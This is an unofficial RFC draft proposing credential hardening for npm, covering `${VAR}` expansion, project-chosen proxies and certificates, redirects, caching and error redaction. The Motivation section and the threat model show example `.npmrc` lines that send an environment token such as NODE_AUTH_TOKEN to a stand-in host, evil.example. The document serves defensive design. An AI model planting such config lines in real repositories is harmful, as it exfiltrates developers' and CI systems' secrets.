# RFC draft: credential hardening for npm (Phase 1b)

> Status: Draft
> Revision: 2
> Date: 2026-10-23

> Phase 1b of an unofficial proposal building on the [npm/rfcs#850](https://github.com/npm/rfcs/pull/850) discussion. [Phase 1a](phase-1a-token-helper.md) adds `tokenHelper`; [Phase 2](phase-2-credential-provider.md) adds a protocol. This document changes how npm sends a credential, whatever its source: a stored `_authToken`, a helper's token or a provider's.

## Summary

npm sends a registry credential wherever the request goes and by whatever route the configuration names, and a project can influence both. A repository's `.npmrc` can choose the proxy and the certificates a credentialed request uses, can name an environment variable to be expanded into a request, npm hands that same configuration to every child npm it starts, a redirect can carry the credential to a different port, and a registry served over `http:` receives it in the clear.

This proposal makes credentials travel under one rule, for stored tokens, helpers and providers alike:

- A credential goes only over `https:`, or `http:` to a loopback address, or `http:` to a registry the user named in their own config.
- A credentialed request takes the settings that reveal a credential only from config a project cannot write, child npm processes included.
- npm does not expand `${VAR}` in a project's config files, so a repository cannot name an environment secret and have it sent.
- A redirect hop keeps the credential only for the same host and port and a scheme that may carry one.
- The credential stays out of the HTTP cache index and out of registry error responses.
- A project `.npmrc` cannot choose the user or global config file.
- A user or global file that the command line or the environment placed inside a project counts as the project's, for every rule above.

It ships as one opt-in setting in a minor release, `strict-credentials`, and is the default in the next major.

## What this protects against, and what it does not

The rules protect against two things: a repository's configuration, which npm reads before it runs any code of the repository, and the network between npm and the registry. They apply only to commands that run no repository code. A bare `npm install` runs the root project's lifecycle scripts and its `.npm-extension.mjs`, and code that runs as the user can read the user's `.npmrc`, the environment and the process list, and can call `npm` with any option it likes. No rule here reaches that. This is the same boundary as [Phase 1a's scope](phase-1a-token-helper.md#scope), and a repository's script can undo any of these rules in its own process.

What the rules do cover is the part that needs no code: `npm view`, `npm ci --ignore-scripts`, `npm audit`, `npm outdated`, an editor or a bot that only reads metadata, with a repository one has just cloned.

## Motivation

[Phase 1a](phase-1a-token-helper.md) already refuses two of these routes for a helper's credential, plain `http:` except to this machine and a proxy or CA that a project chose, because a helper mints a fresh, often broad token. Its runner can decide that before the program starts, from the request's URL and from which layer a setting came from. This proposal extends the same two rules to every credential, a stored `_authToken` included, narrows the second to the settings that actually reveal a credential, and adds what the library does after a credential is sent, and what npm expands before.

The weaknesses below are today's behaviour for a stored `_authToken`. A helper or provider inherits those that 1a does not refuse (redirects, the cache index, error responses, `${VAR}` expansion) until this proposal lands.

- **A repository can name an environment secret.** npm expands `${VAR}` in every key and value of an `.npmrc`. A committed `//evil.example/:_authToken=${NODE_AUTH_TOKEN}` with `registry=https://evil.example/` sends the environment's secret to the repository's host, with no code running. The same secret leaves through `registry=https://evil.example/${NODE_AUTH_TOKEN}/`, through `user-agent=${NODE_AUTH_TOKEN}`, and through the userinfo of a `proxy=` URL, so a rule on credential keys alone does not close it. pnpm stopped expanding `${…}` in repository `.npmrc` files for the same reason ([pnpm docs](https://pnpm.io/npmrc)).
- **A project chooses the route.** A request carrying a credential takes `proxy`, `https-proxy`, `ca`, `cafile` and `strict-ssl` from any config layer, a repository's `.npmrc` among them. That `.npmrc` can send an `http:` credential through its own proxy, or past a certificate it chose. (`noproxy` and `local-address` choose a route too, but reveal nothing a credential depends on.)
- **A file chosen by the command line or the environment can be the repository's.** GitLab's documented `NPM_CONFIG_USERCONFIG=$CI_PROJECT_DIR/.npmrc` makes the checked-out file the user layer. Every rule that trusts "the user's file" trusts the repository there.
- **A child npm reads the project's config as its environment.** When npm starts a script, it exports its resolved config, project values included, as `npm_config_*` variables ([sources.md](sources.md#external-facts)). A child npm reads them as its environment layer, which ranks above every file, so a transport setting the parent took from the repository reaches the child as if the user had set it, and a rule applied only to files is bypassed by `npm run`.
- **`http:` and redirects.** A stored token's key carries no scheme, so a lockfile `resolved` URL over `http:` on the registry's host carries the token. The libraries compare `hostname` when a redirect decides whether to keep `Authorization`, so a redirect on the same host name can change the port and keep the credential (make-fetch-happen 16.0.1 `lib/fetch.js` and minipass-fetch 6.0.0 `lib/index.js`, as they are in npm/cli's tree).
- **The cache index.** make-fetch-happen writes to its cache index every request header a response names in `Vary`, `Authorization` included ([sources.md](sources.md#external-facts)).
- **Error responses.** A registry that echoes the request in a non-2xx answer puts the credential into npm's error, the debug log and CI output.
- **The user and global file can be moved.** A project `.npmrc` can set `userconfig`, `globalconfig` or `prefix` (the global file lives under it), so a repository file loads in the place of the user's.

## Detailed Explanation

### The setting

`strict-credentials` is a boolean, default `false` in a minor release and `true` from the next major. It can be set in any config layer, since it can only add protection; a value of `false` in the project layer is not honoured (only user, global, environment and command-line values may turn it off).

With it `false`, npm behaves as today and warns at the default log level for what the rules below would change. Each warning names the key, the file or layer, and the remedy.

### The project layer

Every rule below says "the project layer". It is made of:

- the project `.npmrc`, and `publishConfig`;
- a user or global file whose path the command line or the environment chose (`--userconfig`, `--globalconfig`, `--prefix`, `NPM_CONFIG_USERCONFIG`, `NPM_CONFIG_GLOBALCONFIG`, `NPM_CONFIG_PREFIX`, `PREFIX`) and that lies inside a project, by [Phase 1a's location rule](phase-1a-token-helper.md#where-it-may-be-set): from the real path of the file's directory upward, a `package.json` or a `.git` marks a project, and the walk stops at the user's home directory.

The second kind counts as the project layer for every rule of this document: the transport keys, `strict-credentials` itself, `${VAR}` expansion, the `http:` allowance, and which stored credentials may be sent. A stored credential read from that layer is the project's own: it travels under the same route rules as any other, and a setting there never relaxes them. The motivating case is GitLab's `NPM_CONFIG_USERCONFIG=$CI_PROJECT_DIR/.npmrc`: the committed file is the user layer today, and after this proposal it is the project layer.

A default path is never moved into the project layer by this rule: a home directory that is the checkout (a PaaS with `HOME=/app`) makes the default user file the repository's own `.npmrc`, which is not a chosen path, as in Phase 1a.

### `${VAR}` expansion

With `strict-credentials` on, npm does not expand `${VAR}` in any key or value of a file of the project layer. The text stays as written, and npm warns at the default level, once per file, naming the key. With the setting off, npm expands as today and warns once per file, naming the keys, wherever strict mode would stop expanding. Files of the user and global layer, and the environment, are expanded as before.

The reason is that the secret does not have to be in a credential key to leave. An environment variable named in a repository's file is read by npm on the user's behalf, and the registry, user agent and proxy keys all put it on a request. Narrowing the rule to credential keys leaves those three open and gives a repository something to find the next one in.

The remedy for a setup that relies on it, the committed `.npmrc` with `${NPM_TOKEN}`, `${NODE_AUTH_TOKEN}` or `${CI_JOB_TOKEN}` that vendors document, is to keep that file outside the checkout, as the user file (a CI step writes it, as `actions/setup-node` does), or to pass the credential on the command line.

### Where a credential may go

A request carries a credential only when its URL is `https:`, or `http:` to a loopback address (`localhost`, any `127.x.x.x`, `[::1]`, as Phase 1a defines it for a helper), or `http:` to a registry for which the user set the allowance below. Otherwise npm sends the request without it and warns at the default log level, once per registry, naming the registry key and the remedy: serve the registry over `https:`, or set the allowance. The warning is not left to `verbose`: a registry that answers 401 with nothing in the request to say why is what a silent withhold looks like.

The same rule covers the credential's source: a stored token, a helper and a provider all pass through it, with the exception that the allowance does not cover a helper's credential (see below).

**The `http:` allowance.** A user whose registry is on a private network without TLS would otherwise have to set `strict-credentials=false` for every registry. The per-registry key

```ini
# ~/.npmrc, global npmrc, the environment or the command line only
//registry.lan.example:4873/:allow-http-credential=true
```

lets a credential go over `http:` to that host and port, with the key written as npm writes its other per-registry keys (`//host:port/:key`, hyphenated name, as in `always-auth`). It is read only from the user and global files, the environment and the command line, and never from the project layer, so a repository cannot grant it to itself. It names a host and port and allows nothing else. It does not cover a helper's credential: a helper mints a fresh and often broad token, and Phase 1a refuses `http:` to a non-loopback host for that reason, before the helper runs.

`npm login` over `http:` still sends a password in the clear, and the allowance does not change that. A login is not a request that carries a stored credential, and 1b does not cover it.

A loopback request with a credential does not go through a proxy, so a local registry is reached directly and the credential never leaves the machine.

### Which settings a credentialed request may take from a project

Of the transport settings, only those that let a third party see a credential are taken away from the project layer:

| Setting | Ignored from the project layer for a credentialed request |
|---|---|
| `ca`, `cafile`, `strict-ssl=false` | Always. They decide who a TLS peer may be, so a project could make npm trust its own server. |
| `proxy`, `https-proxy` | Only for an `http:` request. npm proxies a loopback request, and over `http:` a proxy sees the request whole. Over `https:` a proxy sees only a CONNECT tunnel and never the header. |

`noproxy` and `local-address` are left to every layer: they reveal nothing. A committed corporate `proxy=` therefore keeps working for `https:` registries. A request without a credential keeps taking every setting from every layer.

Phase 1a already does this for a helper's credential: it refuses `proxy`, `https-proxy`, `ca`, `cafile` and `strict-ssl=false` from a project whatever the request's scheme. 1b extends the rule to every credential, with the proxy keys narrowed to the `http:` case, and Phase 1a keeps its stricter form for helpers.

The values come from the command line, the user and global files, the environment as the user's shell set it, and the defaults.

**Say why.** Under `strict-credentials`, a credentialed request that ignores a key of the project layer logs a message at the default level, naming the key and the file, once per registry. A corporate user whose project `.npmrc` carries a `ca` sees why a request failed, and not a bare timeout or certificate error. With the setting off, the same message is a warning of what would change.

**Child npm processes.** The parent knows which values came from a project, and the child, which reads its parent's config as `npm_config_*`, cannot tell. The parent therefore exports a marker naming the keys whose value came from the project layer, and the child ignores those environment values for credentialed requests under the rules of the table. A value the user set in the shell is not marked and is honoured. The marker is set only when a credential could be sent, and only for the keys that came from the project layer.

A check that runs a script which calls `npm` against a repository whose `.npmrc` sets a proxy covers the child case end to end.

### Redirects

npm judges each hop of a redirect by itself. A hop keeps the credential when its target has the same `host` as the request npm started with, that is the same name and port, and a scheme that may carry a credential by the rule above. A hop to another host or port goes on without the credential. A hop from `https:` to `http:` on an address that may not carry one goes on without it.

**What changes.** The earlier rule, in the prototype and in this proposal's first revision, said that once a hop dropped the credential it did not come back. That kept an `http:` registry or `resolved` URL that redirects to `https:` on the same host from getting the credential on the `https:` hop, though that hop would have carried it as a first request.

The credential belongs to the host and port, and what an earlier hop did to it does not change who the host is. Judging each hop alone is simpler and right in this case. A chain that leaves for another host and returns gives the credential to the host it was for, and to nobody else.

**Where the code goes.** Two libraries decide redirects today, make-fetch-happen and, under it, minipass-fetch. Both compare `hostname`, not `host`, when deciding to keep `Authorization` (see [Motivation](#motivation)), which is why a port change keeps it. The first proposal is one token in each: compare `host`. That closes the port leak in the two libraries for every caller, and needs nothing from npm-registry-fetch.

It does not give the per-hop rule above. The libraries keep a header they already sent across a hop to a same-host target, `https:` to `http:` included; they cannot add a header they did not send, which an `http:`-to-`https:` hop needs. So npm-registry-fetch follows the redirects of a credentialed request itself, one hop at a time, to apply the scheme check to each hop and to add the credential to an eligible one. This is needed by the per-hop rule only. If the maintainers decline the per-hop rule, npm-registry-fetch needs no redirect loop, and the hostname fix alone remains.

### The HTTP cache

`Authorization` is never written to make-fetch-happen's cache index, whatever a response's `Vary` says. This is a change to make-fetch-happen 16.x, which writes every header a response names in `Vary` ([sources.md](sources.md#external-facts)), and is proposed there separately. Until it ships, a registry that sends `Vary: Authorization` leaves the credential in the index. registry.npmjs.org does not send it on a packument; no other registry was checked ([sources.md](sources.md#not-verified)).

### Error responses

The error npm-registry-fetch raises for a non-2xx answer loses two things. The request headers are dropped from the error object. In its `message` and in the text of its `body`, every occurrence of the exact credential npm sent on that request is replaced by `***`. A successful response is the caller's data and is not touched.

This is deliberately small. There is no walk of a JSON body and no search for other encodings of the credential. A registry that echoes the `Authorization` header into an error is a registry bug, and the common echo is the header's value as it is, which exact replacement removes. A hostile registry could encode the credential any way it likes, but it already received the credential, which is out of scope.

What this does not do is hide a credential from a registry that is meant to receive it, or recognise a token by its shape: only the credential npm sent is removed.

### Project config cannot choose the user or global file

A project `.npmrc` cannot set `userconfig` or `globalconfig`. In a minor release with `strict-credentials` false, npm warns and still applies the value; with it true, and in the next major by default, npm refuses the setting with an error naming the file and the line.

A project-set `prefix` is not refused: it still applies to installs, which is what a repository that sets `prefix` relies on. npm does not use it to locate the global config file, which is found only from the user's, environment, command-line or built-in `prefix`. The global file therefore cannot move into the repository, and `prefix` alone moves nothing the credential rules depend on.

This covers the project's own choice. A file whose path the command line or the environment chose has no setting to refuse, and a CI job, not the user, writes those values. For such a file inside a project, 1b does not refuse the file: it is the project layer, as [above](#the-project-layer), so none of the credential rules trusts it. Phase 1a's location rule still decides, for the helper, whether a `tokenHelper` in it is honoured, and it uses the same walk.

## Threat model

| Attacker | Action | Today | With Phase 1b |
|---|---|---|---|
| A repository's `.npmrc` | Names `//evil/:_authToken=${NODE_AUTH_TOKEN}` with `registry=https://evil/` | The environment's secret is sent to the repository's host, with no code running | `${VAR}` is not expanded in the project layer; the token is the literal text |
| A repository's `.npmrc` | Puts `${SECRET}` in the registry URL, `user-agent` or the userinfo of a proxy | The secret goes out in the request line, header or proxy credentials | Not expanded in the project layer |
| A repository's `.npmrc` | Sets `ca`, `cafile` or `strict-ssl=false` | The credential goes past the certificate | A credentialed request ignores them, and says so |
| A repository's `.npmrc` | Sets `proxy` or `https-proxy` for an `http:` registry | The credential goes through the proxy | A credentialed `http:` request ignores them; over `https:` a proxy sees only a tunnel |
| A repository, through `npm run` | Relies on the child npm reading `npm_config_*` | The child applies the project's transport as its environment | The marked keys are ignored by the child for credentialed requests |
| A repository checked out by CI | Is the file `NPM_CONFIG_USERCONFIG` names | The repository file is the user layer: it can turn the protections off and have its `${VAR}` expanded | It is the project layer for every rule |
| A lockfile or `.npmrc` | Names an `http:` registry or tarball URL | The credential is sent in the clear | Withheld, with a warning; loopback and a registry the user allowed excepted |
| A registry or tarball host | Redirects to another port of the same host | Followed with the credential | Followed without it |
| A registry or tarball host | Redirects from `http:` to `https:` on the same host | Followed without the credential if the first request had none | The `https:` hop carries it |
| A host on the path | Sends `Vary: Authorization` | The credential is in the cache index | Never written there once make-fetch-happen changes |
| A registry | Echoes the request in an error | The credential reaches the log | Headers dropped, the exact credential replaced |
| A repository's `.npmrc` | Sets `userconfig`, `globalconfig` or `prefix` | A repository file loads as the user's | `userconfig` and `globalconfig` refused; a project `prefix` no longer locates the global file |

Out of scope, as in [Phase 1a](phase-1a-token-helper.md#scope): code that already runs as the user, and a registry the user chose that is itself hostile. [What this protects against](#what-this-protects-against-and-what-it-does-not) says where that line falls for 1b.

## Rationale and Alternatives

**One rule for every credential.** A stricter rule for helpers alone leaves `_authToken`, the credential that leaks today, unchanged, and makes helpers harder to adopt than the token they replace for anyone whose registry is served over `http:` on a network address. Phase 1a takes that cost for the two rules its runner can enforce, because a helper's token is fresh and broad; the rest, and the same rules for stored tokens, wait here. Splitting 1a from this proposal lets the helper ship without a change that affects every user.

**Opt-in first.** Each rule can break a setup that works: an `_authToken` for an `http:` registry on a private network, a committed `${NPM_TOKEN}`, or a project-selected config file. `strict-credentials` lets those users see the warnings for a release before anything is refused.

**Not expanding `${VAR}` at all, and not only for credential keys.** A rule on `_authToken` and `_auth` keys alone leaves the registry URL, `user-agent` and a proxy's userinfo as ways to send the same secret, and any key that reaches a request later. Not expanding in the project layer closes the whole class. The cost is the committed `.npmrc` with a CI variable, a documented pattern, and the remedy is a file outside the checkout, which is what the setup actions already write.

**Only the keys that reveal a credential.** Phase 1a refuses every proxy and TLS key a project chose, for a helper. For every credential, that would also break a committed corporate `proxy=` that serves `https:` registries and reveals nothing there. `ca`, `cafile` and `strict-ssl=false` change who is trusted, so they stay always; a proxy matters only where it sees the request, which is `http:`.

**A per-registry allowance and not a bare setting.** `strict-credentials=false` for one LAN registry without TLS would drop every protection for every registry. A key that names the host and port, and can only be set by the user, keeps the rest. A project cannot write it, so it cannot name its own server.

**Why a marker and not a different export.** Not exporting transport keys to a child would break scripts that rely on the proxy settings reaching a child npm. A marker keeps what the user set and drops only what a project set.

**Refusing project-set `userconfig` and `globalconfig`, and ignoring a project `prefix` for the global file's location,** instead of detecting where a file lies, for the project's own choice: a refusal has no spelling to get past.

For a file chosen on the command line or in the environment there is no setting to refuse, and the location rule detects where the file lies by a walk over its real path's directories for a mark, which needs no identity and is not fooled by a spelling; its limits are in [phase-1a-implementation.md](phase-1a-implementation.md#limits). 1b uses that walk to decide which layer the file is in. A project `prefix` is kept for installs because refusing it would break repositories that use it for that, while the one thing it could do to a credential, move the global file, is cut off.

**Fixing the libraries first.** Comparing `host` in make-fetch-happen and minipass-fetch is one token each and helps every user of those libraries. A custom redirect loop in npm-registry-fetch is more code to keep and to review; it is proposed only for what the one-token fix cannot do, which is to add a credential on an eligible hop.

**Small error redaction.** The prototype masked fourteen encodings and walked JSON. Both were machinery for a registry that echoes a secret in a form nobody has seen, and a registry that echoes its request is already wrong.

## Prior implementation

Much of this was prototyped for the helper alone on the branch `token-helper-hardened` (npm-registry-fetch 0fcdbb7, npm-cli 7836c74): the check for what may carry a credential, the redirect loop, the transport taken from layers a project cannot write, the redaction of error responses and the end-to-end transport checks. This proposal generalises them to every credential and adds the child-process case. The same branch holds heavier machinery that this proposal does not use: containment by filesystem identity and the masking of fourteen encodings. [phase-1b-implementation.md](phase-1b-implementation.md) lists the submissions, each rule with the submission that carries it, and what the branch showed. Nothing for `${VAR}`, the `http:` allowance or the project-layer rule exists on either branch.

## Migration Plan

| Release | Ships | Done when |
|---|---|---|
| A minor | `strict-credentials`, default `false`; a default-level warning wherever it would change behaviour, `${VAR}` and the transport keys included; the `http:` allowance; the make-fetch-happen changes proposed upstream | A user can set it and see what it would change |
| The next major | `strict-credentials` is `true` by default; a project `.npmrc` setting `userconfig` or `globalconfig` is an error | No credential travels outside the rules above unless the user turned them off |

## Compatibility

Who breaks when `strict-credentials` is on:

| Who | What stops working | Mitigation |
|---|---|---|
| A committed `.npmrc` with `${NPM_TOKEN}`, `${NODE_AUTH_TOKEN}` or `${CI_JOB_TOKEN}`, as vendors document | The variable is not expanded, so the request carries the literal text and the registry answers 401 | Keep the file outside the checkout as the user file (a CI step writes it, as `actions/setup-node` does), or pass the credential on the command line |
| A CI job with `NPM_CONFIG_USERCONFIG=$CI_PROJECT_DIR/.npmrc` | The file is the project layer: `${VAR}` is not expanded and its transport keys are ignored | The same: write the file outside the checkout |
| An `_authToken` for an `http:` registry that is not loopback | The request goes out without the token and the registry answers 401 | Serve the registry over `https:`, tunnel it to a loopback address, or set `//host:port/:allow-http-credential=true` in the user or global file |
| A project that selects a config file with `userconfig` or `globalconfig` in its `.npmrc` | The setting is refused | Pass the option on the command line or in the environment, where the user, not the repository, sets it |
| A project whose `.npmrc` sets `prefix` and expects a global config file under it | The global file is looked up under the user's prefix | Set `globalconfig` on the command line or in the environment |
| A project whose `.npmrc` sets `ca`, `cafile` or `strict-ssl=false` that registry traffic needs | A credentialed request ignores it, and a message names the key and the file | Put the setting in the user or global file, or in the environment |
| A project whose `.npmrc` sets `proxy` or `https-proxy` | Nothing for `https:` registries. A credentialed request to an `http:` registry ignores it | Put the setting in the user or global file, or in the environment |
| A redirect to another port of the registry host | The target gets no credential | Configure the registry's real address |

`strict-credentials=false` restores today's behaviour in the next major, in the user or global file, for a setup that cannot change.

## Open decisions for the npm maintainers

The rules are decided. The maintainers are asked to confirm in a design note the name `strict-credentials`, the name of the allowance `allow-http-credential`, and the release they first appear in.
